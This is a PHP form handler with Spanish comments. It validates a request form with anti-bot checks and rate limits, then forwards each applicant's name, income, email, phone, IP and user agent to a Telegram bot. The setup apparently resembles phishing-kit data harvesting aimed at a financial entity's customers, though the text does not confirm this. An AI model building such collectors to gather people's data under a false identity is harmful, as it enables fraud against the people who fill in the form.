<?php
// =====================================================================
// enviar_solicitud.php — Handler POST del formulario de solicitud.
// - NO usa _guard.php (evita el rechazo de cookie HMAC en POST AJAX).
// - En su lugar valida sesión PHP: solo procesa si index.php marcó
//   $_SESSION['solicitud_can_post'] = true al servir el formulario.
// - Rate-limit por IP + honeypot + envío a Telegram.
// - Nunca imprime nada fuera del JSON.
// =====================================================================

// Sesión con misma config que _guard.php (lifetime 2h)
if (session_status() === PHP_SESSION_NONE) {
    @ini_set('session.gc_maxlifetime', '7200');
    @ini_set('session.cookie_lifetime', '7200');
    $__p = session_get_cookie_params();
    @session_set_cookie_params([
        'lifetime' => 7200,
        'path'     => $__p['path']     ?? '/',
        'domain'   => $__p['domain']   ?? '',
        'secure'   => $__p['secure']   ?? false,
        'httponly' => $__p['httponly'] ?? true,
        'samesite' => $__p['samesite'] ?? 'Lax',
    ]);
    @session_start();
}

// Blindaje contra ruido en el body
@ini_set('display_errors', '0');
error_reporting(E_ALL);
while (ob_get_level()) { @ob_end_clean(); }
ob_start();

// Polyfills: php:8.2-apache no trae mbstring -> sin esto, mb_* lanza
// Error fatal y el formulario cae en "Error interno. Intenta nuevamente."
if (!function_exists('mb_strlen')) {
    function mb_strlen($s) { return strlen((string)$s); }
}
if (!function_exists('mb_substr')) {
    function mb_substr($s, $start, $length = null) {
        return $length === null ? substr((string)$s, $start)
                                : substr((string)$s, $start, $length);
    }
}

$respond = function ($arr) {
    while (ob_get_level() > 1) { @ob_end_clean(); }
    @ob_clean();
    header('Content-Type: application/json; charset=UTF-8');
    header('X-Robots-Tag: noindex, nofollow');
    header('Cache-Control: no-store, no-cache, must-revalidate, private');
    echo json_encode($arr);
    @ob_end_flush();
    exit;
};

set_error_handler(function ($sev, $msg, $file, $line) {
    @file_put_contents(__DIR__ . '/solicitud_errors.log',
        date('Y-m-d H:i:s') . " | PHP $sev | $msg @ $file:$line" . PHP_EOL,
        FILE_APPEND | LOCK_EX);
    return true;
});

// Solo POST
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    $respond(['ok' => false, 'msg' => 'method']);
}

try {
    // ---- Validación de sesión: solo tras GET aceptado por index.php ----
    $can = (int)($_SESSION['solicitud_can_post'] ?? 0);
    if ($can <= 0 || (time() - $can) > 7200) {
        $respond(['ok' => false, 'msg' => 'Sesión expirada. Recarga la página.']);
    }

    // ---- Anti-bot: un humano tarda >= 3s en llenar el formulario ----
    // El timestamp se puso al servir el GET; envío instantáneo = bot.
    if ((time() - $can) < 3) {
        $respond(['ok' => false, 'msg' => 'error']);
    }

    // ---- Anti-CSRF/spam: nonce emitido por index.php debe coincidir ----
    if (empty($_SESSION['solicitud_nonce']) ||
        empty($_POST['nonce']) ||
        !hash_equals((string)$_SESSION['solicitud_nonce'], (string)$_POST['nonce'])) {
        $respond(['ok' => false, 'msg' => 'Sesión inválida. Recarga la página.']);
    }

    // ---- Marca JS: solo el submit real (fetch) la manda ----
    if (($_POST['jsok'] ?? '') !== '1') {
        $respond(['ok' => false, 'msg' => 'error']);
    }

    // ---- Tope por sesión: máx 3 envíos (además del rate-limit por IP) ----
    $_SESSION['solicitud_count'] = (int)($_SESSION['solicitud_count'] ?? 0) + 1;
    if ($_SESSION['solicitud_count'] > 3) {
        $respond(['ok' => false, 'msg' => 'Demasiados intentos, intenta más tarde.']);
    }

    // ---- Honeypots (campo invisible que solo los bots llenan) ----
    if (!empty($_POST['website']) || !empty($_POST['empresa'])) {
        $respond(['ok' => false, 'msg' => 'error']);
    }

    // ---- Rate-limit por IP: 3 envíos / 10 min ----
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $rl_dir  = sys_get_temp_dir() . '/sim_solicitud_rate';
    @mkdir($rl_dir, 0700, true);
    $rl_safe = preg_replace('/[^0-9a-fA-F:.]/', '_', $ip);
    $rl_file = $rl_dir . "/$rl_safe.json";
    $now = time();
    $rs = ['n' => 0, 't' => $now];
    if (is_file($rl_file)) {
        $raw = @file_get_contents($rl_file);
        $tmp = $raw ? json_decode($raw, true) : null;
        if (is_array($tmp) && isset($tmp['n'], $tmp['t'])) $rs = $tmp;
    }
    if (($now - $rs['t']) > 600) $rs = ['n' => 0, 't' => $now];
    $rs['n']++;
    @file_put_contents($rl_file, json_encode($rs), LOCK_EX);
    if ($rs['n'] > 3) {
        $respond(['ok' => false, 'msg' => 'Demasiados intentos, intenta más tarde.']);
    }

    // ---- Sanitizar ----
    $clean = function ($k, $max = 120) {
        $v = trim((string)($_POST[$k] ?? ''));
        $v = preg_replace('/[\r\n\t]+/', ' ', $v);
        return mb_substr($v, 0, $max);
    };
    $nombres   = $clean('nombres', 60);
    $apellidos = $clean('apellidos', 60);
    // El monto llega con comas de miles (25,000) -> quedarnos solo dígitos
    $ingreso   = mb_substr(preg_replace('/\D/', '', (string)($_POST['ingreso'] ?? '')), 0, 12);
    $email     = $clean('email', 100);
    $telefono  = $clean('telefono', 20);
    $tiempo    = $clean('tiempo', 40);

    // ---- Validaciones ----
    $errores = [];
    if (mb_strlen($nombres)   < 2) $errores[] = 'nombres';
    if (mb_strlen($apellidos) < 2) $errores[] = 'apellidos';
    if (strlen($ingreso) < 3) $errores[] = 'ingreso';
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))              $errores[] = 'email';
    if (!preg_match('/^[0-9 +\-()]{7,20}$/', $telefono))         $errores[] = 'telefono';
    if (mb_strlen($tiempo)    < 2) $errores[] = 'tiempo';
    if ($errores) {
        $respond(['ok' => false, 'msg' => 'Complete correctamente los campos', 'fields' => $errores]);
    }

    // ---- Enviar a Telegram ----
    require_once __DIR__ . '/_tg.php';

    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 200);
    $texto  = "🆕 SOLICITUD RECIBIDA\n";
    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
    $texto .= "👤 Nombres: $nombres $apellidos\n";
    $texto .= "💵 Ingreso C\$: " . number_format((float)$ingreso, 0, '.', ',') . "\n";
    $texto .= "✉️  Email:    $email\n";
    $texto .= "📞 Teléfono: $telefono\n";
    $texto .= "⏳ Tiempo con la entidad: $tiempo\n";
    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
    $texto .= "🌐 IP: $ip\n";
    $texto .= "🖥️  UA: $ua\n";
    $texto .= "🕒 " . date('Y-m-d H:i:s');

    $sent = false;
    if (function_exists('tg_send')) { $sent = (bool)@tg_send($texto); }

    // ---- Marcar como enviada en sesión ----
    $_SESSION['solicitud_ok']   = true;
    $_SESSION['solicitud_data'] = [
        'nombres' => $nombres, 'apellidos' => $apellidos,
        'email'   => $email,   'telefono'  => $telefono,
        'ingreso' => $ingreso, 'tiempo'    => $tiempo,
        'ts'      => $now,
    ];

    $respond(['ok' => true, 'sent' => $sent]);

} catch (\Throwable $e) {
    @file_put_contents(__DIR__ . '/solicitud_errors.log',
        date('Y-m-d H:i:s') . " | EXC | " . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine() . PHP_EOL,
        FILE_APPEND | LOCK_EX);
    $respond(['ok' => false, 'msg' => 'Error interno. Intenta nuevamente.']);
}
